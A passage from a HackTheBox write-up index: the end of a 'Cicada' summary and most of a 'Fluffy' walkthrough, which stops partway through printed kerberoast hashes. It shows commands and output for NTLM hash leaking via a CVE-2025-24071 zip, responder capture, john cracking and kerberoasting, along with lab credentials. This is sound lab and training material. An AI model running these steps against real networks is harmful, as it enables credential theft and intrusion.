nothing useful</li> <li>LDAP enumeration \u2192 enumerated users, found plaintext creds on LDAP Description! (david.orelious)</li> <li>Correlated user creds with <code>SMB</code> , <code>LDAP</code> , <code>RPC</code> services</li> <li>SMB enumeration revealed <code>share</code> containing a txt file, containing credentials for another user (emily.oscars)</li> <li>Correlated user creds with <code>WINRM</code> service</li> <li>logged in winrm as user emily.oscars</li> <li>grabbed user flag</li> </ol>"},{"location":"ch3ckm8_HTB_cicada/#privesc_1","title":"Privesc","text":"<ol> <li>Group membership of the user indicated backup privileges (Backup Operators group)</li> <li>Abused privileges via writing registry hives to temp folder, and downloading them locally</li> <li>Dumped the registry hives locally, revealing the <code>NTLM</code> hash of Administrator</li> <li>Logged in as administrator via the <code>NTLM</code> hash</li> <li>grabbed root flag</li> </ol>"},{"location":"ch3ckm8_HTB_cicada/#sidenotes","title":"Sidenotes","text":"<p>All in all, this one had somewhat straightforward (extensive) enumeration to achieve foothold, while privesc was all about exploiting the backup related privileges the user had, as a member of Backup Operators group. Fun fact, this machine has the exact same privesc methodology as Blackfield (Windows, Hard).  The only part that was new to me, was one of the user\u2019s creds that where found as plaintext on the LDAP Description</p> <p></p>"},{"location":"ch3ckm8_HTB_fluffy/","title":"Fluffy","text":""},{"location":"ch3ckm8_HTB_fluffy/#intro","title":"Intro","text":"<p> Description: <pre><code>As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!, so its an assumed breach scenario\n</code></pre> [[windows]] [[AssumedBreach]]  [[certificates]] [[certvulntoESC16]] [[shadowcredential]] Tags: #windows #AssumedBreach  #certificates #certvulntoESC16 #shadowcredential Tools used: - smbclient (SMB enumeration) - crackmapexec (SMB enumeration) - responder (receiving incoming connection for NTLM leak) - john the ripper (NTLM hash cracking) - GetUserSPNs.py (identifying kerberoastable accounts) - certipy (managing certificates)</p>"},{"location":"ch3ckm8_HTB_fluffy/#reconnaissance","title":"Reconnaissance","text":"<p>add machine to etc/hosts <pre><code>echo '10.10.11.69 fluffy.htb' | sudo tee -a /etc/hosts\n</code></pre></p> <p>lets start with our nmap scan <pre><code>nmap fluffy.htb -sV -Pn -T4\n</code></pre> output: <pre><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-03 21:08 EEST\nNmap scan report for fluffy.htb (10.10.11.69)\nHost is up (0.055s latency).\nNot shown: 990 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 01:09:07Z)\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 51.78 seconds\n</code></pre> Discovered classic AD ports: DNS (53), Kerberos (88), LDAP (389/636/3268/3269), SMB (139/445), WinRM (5985), RPC (135/593). Host reported as <code>DC01</code> (Windows Server 2019).</p> <p>Next, this is an assumed breach scenario, meaning we have already compromised a user (see machine's description): <pre><code>j.fleischman\nJ0elTHEM4n1990!\n</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#correlating-creds-with-services","title":"Correlating creds with services","text":"<pre><code>nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!'\n</code></pre> <p>i made a script for automatic the netexec procedure for the services i wanted to test</p> <p>output: <pre><code>\u250c\u2500[ch3ckm8@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $./nxc_services_checker.sh\n[*] Checking mssql on fluffy.htb\n[*] Checking smb on fluffy.htb\nSMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.69     445    DC01             [+] fluffy.htb\\j.fleischman:J0elTHEM4n1990! \n[*] Checking ftp on fluffy.htb\n[*] Checking ldap on fluffy.htb\nLDAP        10.10.11.69     389    fluffy.htb       [-] Error retrieving os arch of 10.10.11.69: Could not connect: timed out\nSMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.69     389    DC01             [+] fluffy.htb\\j.fleischman:J0elTHEM4n1990! \n[*] Checking rdp on fluffy.htb\n[*] Checking ssh on fluffy.htb\n[*] Checking winrm on fluffy.htb\nWINRM       10.10.11.69     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)\nWINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\\j.fleischman:J0elTHEM4n1990!\n</code></pre> so right here, it seems that login to SMB is successful, so lets start there</p>"},{"location":"ch3ckm8_HTB_fluffy/#smb-enumeration-as-jfleischman","title":"SMB enumeration as j.fleischman","text":"<p>Lets start enumerating shares with smb client <pre><code>smbclient -U j.fleischman -L fluffy.htb\n</code></pre> output <pre><code>\u2514\u2500\u2500\u257c $smbclient -U j.fleischman -L fluffy.htb\nPassword for [WORKGROUP\\j.fleischman]:\n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n    IT              Disk      \n    NETLOGON        Disk      Logon server share \n    SYSVOL          Disk      Logon server share \n</code></pre></p> <p>lets explore the IT share since it appears to be a non systemic/default one <pre><code>smbclient -U j.fleischman //fluffy.htb/IT\n</code></pre> output <pre><code>\u2514\u2500\u2500\u257c $smbclient //fluffy.htb/IT -U j.fleischman\nPassword for [WORKGROUP\\j.fleischman]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Wed Jun  4 04:35:18 2025\n  ..                                  D        0  Wed Jun  4 04:35:18 2025\n  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 18:08:44 2025\n  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 18:04:05 2025\n  KeePass-2.58                        D        0  Fri Apr 18 18:08:38 2025\n  KeePass-2.58.zip                    A  3225346  Fri Apr 18 18:03:17 2025\n  Upgrade_Notice.pdf                  A   169963  Sat May 17 17:31:07 2025\n\n        5842943 blocks of size 4096. 1328928 blocks available\n</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#inspecting-shares-contents","title":"Inspecting share's contents","text":"<p>Lets download those locally and inspect them: <pre><code>get Everything-1.4.1.1026.x64.zip\nget KeePass-2.58.zip \nget Upgrade_Notice.pdf \n</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#inspecting-the-pdf-file","title":"Inspecting the PDF file","text":"<ul> <li>First, lets inspect the pdf file, there are 3 pages:  Interesting, the 2nd page of the pdf just gives out what the machine is vulnerable to: <pre><code>CVE-2025-24996 | Critical\nCVE-2025-24071 | Critical\nCVE-2025-46785 | High\nCVE-2025-29968 | High\nCVE-2025-21193 | Medium\nCVE-2025-3445  | Low\n</code></pre> Lets analyze those CVEs one by one:</li> </ul>"},{"location":"ch3ckm8_HTB_fluffy/#analyzing-the-cves-mentioned-inside-the-pdf","title":"Analyzing the CVEs mentioned inside the PDF","text":"<ul> <li> <p>CVE-2025-24996 | Critical https://www.cve.org/CVERecord?id=CVE-2025-24996 <code>External control of file name or path in Windows NTLM allows an unauthorized attacker to perform spoofing over a network.</code> </p> </li> <li> <p>CVE-2025-24071 | Critical https://github.com/ThemeHackers/CVE-2025-24071 <code>The issue arises from the implicit trust and automatic file parsing behavior of .library-ms files in Windows Explorer. An unauthenticated attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user's NTLM hash. PoC (Proof of Concept) exploits for this vulnerability are now publicly available, making it a current threat.</code>  found this poc: https://github.com/0x6rss/CVE-2025-24071_PoC keep that in mind for later, and lets find more about the rest of the CVEs:</p> </li> <li> <p>CVE-2025-46785 | High <code>Buffer over-read in some Zoom Workplace Apps for Windows may allow an authenticated user to conduct a denial of service via network access.</code> https://www.cvedetails.com/cve/CVE-2025-46785/ </p> </li> <li> <p>CVE-2025-29968 | High <code>Improper input validation in Active Directory Certificate Services (AD CS) allows an authorized attacker to deny service over a network.</code> </p> </li> <li> <p>CVE-2025-21193 | Medium <code>Active Directory Federation Server Spoofing Vulnerability</code> </p> </li> <li> <p>CVE-2025-3445  | Low https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMHOLTARCHIVER-9689905  So we analyzed what each CVE describes, but in order to decide which one to chose i decided to also check the rest of the files in case any correlations with the CVEs exist:</p> </li> </ul>"},{"location":"ch3ckm8_HTB_fluffy/#inspecting-the-rest-of-the-files","title":"Inspecting the rest of the files","text":"<ul> <li> <p>then lets inspect the Everything-1.4.1.1026.x64.zip  hm we see an exe and an .lng file here... nothing comes to my mind except that it refers to an app called Everything, which is used for searching stuff on a windows machine.</p> </li> <li> <p>lets unzip the KeePass-2.58.zip   From all those folders and files, the most interesting ones where:</p> </li> </ul> <p>KeePass-2.58.zip:</p> <p>From the file name, we can see that the version is 2.58, which is also validated by its contents: <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt;\n&lt;configuration&gt;\n    &lt;startup useLegacyV2RuntimeActivationPolicy=\"true\"&gt;\n        &lt;supportedRuntime version=\"v4.0\" /&gt;\n        &lt;supportedRuntime version=\"v2.0.50727\" /&gt;\n    &lt;/startup&gt;\n    &lt;runtime&gt;\n        &lt;assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\"&gt;\n            &lt;dependentAssembly&gt;\n                &lt;assemblyIdentity name=\"KeePass\"\n                    publicKeyToken=\"fed2ed7716aecf5c\"\n                    culture=\"neutral\" /&gt;\n                &lt;bindingRedirect oldVersion=\"2.0.9.0-2.57.127.127\"\n                    newVersion=\"2.58.0.0\" /&gt;\n            &lt;/dependentAssembly&gt;\n        &lt;/assemblyBinding&gt;\n        &lt;enforceFIPSPolicy enabled=\"false\" /&gt;\n        &lt;loadFromRemoteSources enabled=\"true\" /&gt;\n    &lt;/runtime&gt;\n    &lt;appSettings&gt;\n        &lt;add key=\"EnableWindowsFormsHighDpiAutoResizing\" value=\"true\" /&gt;\n    &lt;/appSettings&gt;\n&lt;/configuration&gt;\n</code></pre> Interesting, it contains a publickey token, i dont know yet where it could be used</p> <p>XSL folder:  To sump up: KDBX_Common.xsl -&gt; nothing interesting KDBX_DetailsFull_HTML.xsl -&gt; nothing interesting KDBX_DetailsLight_HTML.xsl -&gt; nothing interesting KDBX_Tabular_HTML.xsl -&gt; nothing interesting</p> <p>Nothing interesting found by observing each one, overakk it appears to be some sort of <code>XSL</code> (Extensible Stylesheet Language), does not provide any additional information though regarding any CVE mentioned above. </p>"},{"location":"ch3ckm8_HTB_fluffy/#foothold","title":"Foothold","text":"<p>I decided to search for the most suitable CVE to exploit by severity starting with the <code>Critical</code> ones.  By searching online i found an exploit for CVE-2025-24071</p>"},{"location":"ch3ckm8_HTB_fluffy/#exploiting-cve-2025-24071-leaking-ntlm-hash","title":"Exploiting CVE-2025-24071 (Leaking NTLM hash)","text":"<p>Using this script: https://github.com/ThemeHackers/CVE-2025-24071 type your ip, and a random filename, and run, it should produce a <code>.zip</code> file as seen below (exploit.zip).</p>"},{"location":"ch3ckm8_HTB_fluffy/#uploading-the-script-via-smbclient","title":"Uploading the script via smbclient","text":"<p>then upload the automatically generated <code>exploit.zip</code> file through the smbclient: ( i am on the same directory as the exploit.zip thats why i dont specify path on the put command) <pre><code>\u250c\u2500[ch3ckm8@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $smbclient //fluffy.htb/IT -U j.fleischman\nPassword for [WORKGROUP\\j.fleischman]:\nTry \"help\" to get a list of possible commands.\n\nsmb: \\&gt; put exploit.zip\nputting file exploit.zip as \\exploit.zip (1,9 kb/s) (average 1,9 kb/s)\n</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#listen-for-incoming-connections","title":"Listen for incoming connections","text":"<p>run responder locally:  <pre><code>responder -I tun0 -wvF\n</code></pre></p> <p>aaand we captured NTML hashes!  niiice, lets take on of those hashes with the prospect of cracking it: <pre><code>[SMB] NTLMv2-SSP Client   : 10.10.11.69\n[SMB] NTLMv2-SSP Username : FLUFFY\\p.agila\n[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:2a097c3f1a0cn</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#cracking-ntlm-hash","title":"Cracking NTLM hash","text":"<p>Put it on a txt (the whole NTLMv2-SSP Hash value), and attempted to crack it with john: <pre><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n</code></pre> output <pre><code>\u2514\u2500\u2500\u257c $john hash.txt --wordlist=rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nprometheusx-303  (p.agila)     \n1g 0:00:00:02 DONE (2025-06-03 23:11) 0.4901g/s 2214Kp/s 2214Kc/s 2214KC/s promo010..programmer_pt\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed.\n</code></pre> so now we have more creds: <pre><code>p.agila\nprometheusx-303\n</code></pre> Next, we will check where we can login with these.</p>"},{"location":"ch3ckm8_HTB_fluffy/#correlating-creds-with-services_1","title":"Correlating creds with services","text":"<p>lets try to login now with these creds, by checking first with our nxc script: <pre><code>[*] Checking mssql on fluffy.htb\n[*] Checking ssh on fluffy.htb\n[*] Checking winrm on fluffy.htb\nWINRM       10.10.11.69     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)\nWINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\\p.agila:prometheusx-303\n[*] Checking smb on fluffy.htb\nSMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.69     445    DC01             [+] fluffy.htb\\p.agila:prometheusx-303 \n[*] Checking ftp on fluffy.htb\n[*] Checking ldap on fluffy.htb\nLDAP        10.10.11.69     389    fluffy.htb       [-] Error retrieving os arch of 10.10.11.69: Could not connect: timed out\nSMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.69     389    DC01             [+] fluffy.htb\\p.agila:prometheusx-303 \n[*] Checking rdp on fluffy.htb\n</code></pre> according to the output, with those creds we can login on <code>SMB</code> and <code>LDAP</code> </p>"},{"location":"ch3ckm8_HTB_fluffy/#ldap-enumeration-as-pagila","title":"LDAP enumeration as p.agila","text":"<p><pre><code>ldapsearch -x -H ldap://fluffy.htb -D \"p.agila@fluffy.htb\" -W -b \"dc=fluffy,dc=htb\" \"(objectClass=group)\"\n</code></pre> this prints some interesting stuff but nothing too obvious, lets move on with the SMB enumeration</p>"},{"location":"ch3ckm8_HTB_fluffy/#smb-enumeration-as-pagila","title":"SMB enumeration as p.agila","text":"<p><pre><code>smbclient -U p.agila -L fluffy.htb\n</code></pre> hm we see the user has access to the exact same shares, nothing valuable found regarding shares</p> <p>lets try displaying more  info with crackmapexec, first for the users:</p>"},{"location":"ch3ckm8_HTB_fluffy/#enumerating-users","title":"Enumerating Users","text":"<p><pre><code>crackmapexec smb fluffy.htb -u p.agila -p 'prometheusx-303' --users\n</code></pre> output: <pre><code>\u2514\u2500\u2500\u257c $crackmapexec smb fluffy.htb -u p.agila -p 'prometheusx-303' --users\n[*] First time use detected\n[*] Creating home directory structure\n[*] Creating missing folder logs\n[*] Creating missing folder modules\n[*] Creating missing folder protocols\n[*] Creating missing folder workspaces\n[*] Creating missing folder obfuscated_scripts\n[*] Creating missing folder screenshots\n[*] Copying default configuration file\nSMB         10.10.11.69     445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.69     445    DC01             [+] fluffy.htb\\p.agila:prometheusx-303 \nSMB         10.10.11.69     445    DC01             [*] Trying to dump local users with SAMRPC protocol\nSMB         10.10.11.69     445    DC01             [+] Enumerated domain user(s)\nSMB         10.10.11.69     445    DC01             fluffy.htb\\Administrator                  Built-in account for administering the computer/domain\nSMB         10.10.11.69     445    DC01             fluffy.htb\\Guest                          Built-in account for guest access to the computer/domain\nSMB         10.10.11.69     445    DC01             fluffy.htb\\krbtgt                         Key Distribution Center Service Account\nSMB         10.10.11.69     445    DC01             fluffy.htb\\ca_svc                         \nSMB         10.10.11.69     445    DC01             fluffy.htb\\ldap_svc                       \nSMB         10.10.11.69     445    DC01             fluffy.htb\\p.agila                        \nSMB         10.10.11.69     445    DC01             fluffy.htb\\winrm_svc                      \nSMB         10.10.11.69     445    DC01             fluffy.htb\\j.coffey                       \nSMB         10.10.11.69     445    DC01             fluffy.htb\\j.fleischman    \n</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#enumerating-groups","title":"Enumerating Groups","text":"<p><pre><code>crackmapexec smb fluffy.htb -u p.agila -p 'prometheusx-303' --groups\n</code></pre> output: <pre><code>\u2514\u2500\u2500\u257c $crackmapexec smb fluffy.htb -u p.agila -p 'prometheusx-303' --groups\nSMB         10.10.11.69     445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.69     445    DC01             [+] fluffy.htb\\p.agila:prometheusx-303 \nSMB         10.10.11.69     445    DC01             [+] Enumerated domain group(s)\nSMB         10.10.11.69     445    DC01             Service Accounts                         membercount: 3\nSMB         10.10.11.69     445    DC01             Service Account Managers                 membercount: 2\nSMB         10.10.11.69     445    DC01             DnsUpdateProxy                           membercount: 0\nSMB         10.10.11.69     445    DC01             DnsAdmins                                membercount: 0\nSMB         10.10.11.69     445    DC01             Enterprise Key Admins                    membercount: 0\nSMB         10.10.11.69     445    DC01             Key Admins                               membercount: 0\nSMB         10.10.11.69     445    DC01             Protected Users                          membercount: 0\nSMB         10.10.11.69     445    DC01             Cloneable Domain Controllers             membercount: 0\nSMB         10.10.11.69     445    DC01             Enterprise Read-only Domain Controllers  membercount: 0\nSMB         10.10.11.69     445    DC01             Read-only Domain Controllers             membercount: 0\nSMB         10.10.11.69     445    DC01             Denied RODC Password Replication Group   membercount: 8\nSMB         10.10.11.69     445    DC01             Allowed RODC Password Replication Group  membercount: 0\nSMB         10.10.11.69     445    DC01             Terminal Server License Servers          membercount: 0\nSMB         10.10.11.69     445    DC01             Windows Authorization Access Group       membercount: 1\nSMB         10.10.11.69     445    DC01             Incoming Forest Trust Builders           membercount: 0\nSMB         10.10.11.69     445    DC01             Pre-Windows 2000 Compatible Access       membercount: 2\nSMB         10.10.11.69     445    DC01             Account Operators                        membercount: 0\nSMB         10.10.11.69     445    DC01             Server Operators                         membercount: 0\nSMB         10.10.11.69     445    DC01             RAS and IAS Servers                      membercount: 0\nSMB         10.10.11.69     445    DC01             Group Policy Creator Owners              membercount: 1\nSMB         10.10.11.69     445    DC01             Domain Guests                            membercount: 0\nSMB         10.10.11.69     445    DC01             Domain Users                             membercount: 0\nSMB         10.10.11.69     445    DC01             Domain Admins                            membercount: 1\nSMB         10.10.11.69     445    DC01             Cert Publishers                          membercount: 2\nSMB         10.10.11.69     445    DC01             Enterprise Admins                        membercount: 1\nSMB         10.10.11.69     445    DC01             Schema Admins                            membercount: 1\nSMB         10.10.11.69     445    DC01             Domain Controllers                       membercount: 0\nSMB         10.10.11.69     445    DC01             Domain Computers                         membercount: 0\nSMB         10.10.11.69     445    DC01             Storage Replica Administrators           membercount: 0\nSMB         10.10.11.69     445    DC01             Remote Management Users                  membercount: 1\nSMB         10.10.11.69     445    DC01             Access Control Assistance Operators      membercount: 0\nSMB         10.10.11.69     445    DC01             Hyper-V Administrators                   membercount: 0\nSMB         10.10.11.69     445    DC01             RDS Management Servers                   membercount: 0\nSMB         10.10.11.69     445    DC01             RDS Endpoint Servers                     membercount: 0\nSMB         10.10.11.69     445    DC01             RDS Remote Access Servers                membercount: 0\nSMB         10.10.11.69     445    DC01             Certificate Service DCOM Access          membercount: 1\nSMB         10.10.11.69     445    DC01             Event Log Readers                        membercount: 0\nSMB         10.10.11.69     445    DC01             Cryptographic Operators                  membercount: 0\nSMB         10.10.11.69     445    DC01             IIS_IUSRS                                membercount: 0\nSMB         10.10.11.69     445    DC01             Distributed COM Users                    membercount: 0\nSMB         10.10.11.69     445    DC01             Performance Log Users                    membercount: 0\nSMB         10.10.11.69     445    DC01             Performance Monitor Users                membercount: 0\nSMB         10.10.11.69     445    DC01             Network Configuration Operators          membercount: 0\nSMB         10.10.11.69     445    DC01             Remote Desktop Users                     membercount: 0\nSMB         10.10.11.69     445    DC01             Replicator                               membercount: 0\nSMB         10.10.11.69     445    DC01             Backup Operators                         membercount: 0\nSMB         10.10.11.69     445    DC01             Print Operators                          membercount: 0\nSMB         10.10.11.69     445    DC01             Guests                                   membercount: 2\nSMB         10.10.11.69     445    DC01             Users                                    membercount: 3\nSMB         10.10.11.69     445    DC01             Administrators                           membercount: 3\n</code></pre> we see lots of groups. </p> <p>[TODO] -&gt; could i run bloodhound with the initial user? if yes add it here too prior to doing the foothold  [TODO] -&gt; had no patience, but is this way going to work in general? (except the fact that i did not run bloodhound to understand whats going on exaclty)</p>"},{"location":"ch3ckm8_HTB_fluffy/#finding-hashes-of-kerberoastable-accounts","title":"Finding hashes of kerberoastable accounts","text":"<p><pre><code>GetUserSPNs.py fluffy.htb/p.agila:prometheusx-303 -dc-ip 10.10.11.69 -request\n</code></pre> output <pre><code>\u2514\u2500\u2500\u257c $python3 GetUserSPNs.py fluffy.htb/p.agila:prometheusx-303 -dc-ip 10.10.11.69 -request\nImpacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies \n\nServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation \n----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------\nADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 19:07:50.136701  2025-05-22 01:21:15.969274             \nLDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 19:17:00.599545  &lt;never&gt;                                \nWINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-18 03:51:16.786913  2025-06-04 04:33:27.044985             \n\n[-] CCache file is not found. Skipping...\n[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great\n</code></pre></p> <p>Lets sync with the domain and try again <pre><code>ntpdate fluffy.htb\n</code></pre></p> <p><pre><code>python3 GetUserSPNs.py fluffy.htb/p.agila:prometheusx-303 -dc-ip 10.10.11.69 -request\n</code></pre> output: <pre><code>Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies \n\nServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation \n----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------\nADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 19:07:50.136701  2025-05-22 01:21:15.969274             \nLDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 19:17:00.599545  &lt;never&gt;                                \nWINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-18 03:51:16.786913  2025-06-04 04:33:27.044985             \n\n[-] CCache file is not found. Skipping...\n$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$3f61cb5c82fab8ea78b41b82f4a9ed91$760e1176c349bbe95651bb7bc478312adf7246d6bf4b2eec568f2197cf1f502b1575c7c4f6f7c8361e4a913162abe0a664169f44b30e435f1efac0e99730993f38fbbfffa1e84fd7209d36d67d69eac8a779444d23d4ebfdbff025c5c6e60addb93310e289f86006fde5a86c45ff79b2677ec8466e2e077ff51d1ec813c8729363368f8c4eddb87344ef2189f84da99658d86a995f98b3ccdfaad9d21a9c9da5af9d287a88dbdf74a07fe9d4aab0a714db10b064d03996dfcda7a71e2ba72e5ac7c67cf708644733593ff2987f096b3d7fb7b3ec22fbcbd4cc81100d950c778d3e17533d128924f11c9990a968039b9e7549fa44b7c42b0890a2d90b86a9d932c7f4f00793a64a978e878f03b531582b60606f55da46f0f00fdb7d64f9782ce15d6c8aba05f815941267b1d349ca7004a0c39731863824eafedda03ef4093ef40ea5ffcba9848af0f844f6c551730da8fe2cda2528882d839fe4e521b26885a4fa5b825d4458894f5b2c821e70ff31da70e558aa5c5bce791eed7e09dc808dc4ed7e53b54a9a4b9b6109da0e4143b64b6588717e02b9b3e407b53eb262b9be4e48cad6e3e150f8c5b5690b923fa465d13bb34fefa22fe7082aa36df7068f268af1e287e97743c61d6ef16001dd45eadba8397487311d79e210aa1f98df3398533a9c9774b15b3ee74a74b194725aeaffc2905acc393bd75aa46c3f3b9caacab38817cff747888efbf20dc05f70bbaa535cdf3acd0778eef347076f14d2f70661dcdd5b17366574b92b6c0aaa6038dc9a4180bb4e3676f96740fb209f1c7bddc52caf74ef2c97e5c3fbf2de31aa0ac545274094f392981b3111fed09759cfc4386da46d7081957754a002493df6b7a4a16e49f4b82fe07795ff6383ce37c2eedc4188fdf49115768c18bd562d23a0ca3859627f6a592d032a56a77c31059d71e49e75443d28b695dcad129c54cb4ee82f57c554e6e3d0dcc0bb749ec3fea7fa4ba3f879d17ad1f29e71db0b3f4a1784a42bb2d8ea892e1e4a616dfba28af107628a4d973500ee52459f7b9410c3da4b582559e2a9751e8f6199bb78fdf31a84eeb062ac02bf0c5d59a6772c896ae03e4b051d6ecf1d4f88819a3c6bad436bdb315d22c8c3a77f3329d1718e717436b9c68c159ebf69a3177653c77171fc195654fe198ab6cd761ee72826eeba26fcb2672ab39bc9db0889b178e914c9e6d5a6aefa0ff5bcaa894a2b0ceb95b08be3e6ee3b15a939ef3a50325ea407555b653a3b8670ea22061d3823395fb58a20d6868acbbc267d53cfa1eae6929b194eb038140a5f885b20833e24c9131fbade500aedb93de71a8360213c191e03b73fa695ac36f3e49f7333a77411de6142d4367c9eba47b23e2a6489ecfb19bee5afd6f105cdf2cf05a28513aa61c4725a49fbc4a827550e08d306fb58e639f450623b979e13eebafddd8df0deea6db1b6265291f2f2df2835050dc874686e514be03eadda94b7\n$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$775a1ab850490bb54f9d6035783564bf$e9198ec9e9e34d60de08f81af8ff92fdd5228cd56fc8b326c597aec4460c308b03d3312b9ef5fa76fb2714937fb0b12d0123fd3f585b766fe9e4fcc1b38206000b89f008cf8ef73275b6c205660c0b214db64a3e9640dcb4fba64ed19a134433d26dc3479b6c8a9e47cf54bd4a3872e07281a3ccc6a33148e1634731cc6aa1ae2844d8e372e1e4cc3ca6b74f3f9481127571902d8410605b0290ba6dba0bba0ca566935f99c0b03f36c4b37cd7c2ec141b50c44721de33d9801629d969a815430a696416c9ac78dcd20c0f78424c00e6678c3afff5f0fae58c959370506cc1c56f2e6489f4c577dc5c138d04ad0dafbcc43f0f98a8a9014990bf9b8720abacfe279fb436124c2cb5227bf2a2bdfb0ee3068e895ac90f3c5de44105a0d2e78a58264c0bee809b8b2aa38724e94973e3d78cb23a25aafe148ac716fc502aa28516a3a19e73df3fd861a3200cea46b936721a2cd1269b868bf65d77475e083d534a7de3ef170da9b0ba3429b9a9f9fa3b3250b41ffef0bef4a00732f8e76f2350a1cc242df66f5e1e1f120f23221a974a7db662bf8dba78b7fd99993bb3f70c23a9dcbb4e00380152e9b93cb3924636fa15ba49e7fbb268df94eb639101cf0bc328331f0258f7c8aea87497b58b6c134b9ab71daf024ab7b85783378cf83e4cf3811591a8af30d91c0cb5f7358238056a652ae3b590fec8828e49851fb68f112dd5cafb63c6890585bb25fb376fbe64b0cf816f3f908df14ef0503d2b1170b75f1e7355af1994e0caec63d36f13d718e94c4ba56744d250517dfbe80ca085d5fc159c4a019868cc4a13184fddc6f42692d6b121561b3805d36a1a8fbf7b07ea85d97c9a22682c9f7458f62cf0163652f67af349ec5751cf86ed261f5efdd7e505710005ff3a6e3e8eebb13316807d77c99bb0f94217bf338da13f8f6626276d63cccea402225ccab20185b840618767b1f1b4ea1708ccb8bf858d6578decd9c0b3eaa3d141fe8f6dafa8001359ecf5a5510eccbee7fd08ee6ccbc52a3352585b69fd6f30972ad6a5e658717e75f5ba4e5fb5f2295364bd0e96bb0c94bac0f75819004adc702277a1da8d9d4709190ae6e4f9c516daafab76af39e4236711566bfb2d060dad4aa28263e3e17c55cdbd75623aab2c570bbc78123c33f47d3d159c97a806c9d5acda3d649a712d0db70e125dd9a2a5de6f94567465376509aba941dd768620637d99bc4a693624f181ca1b94e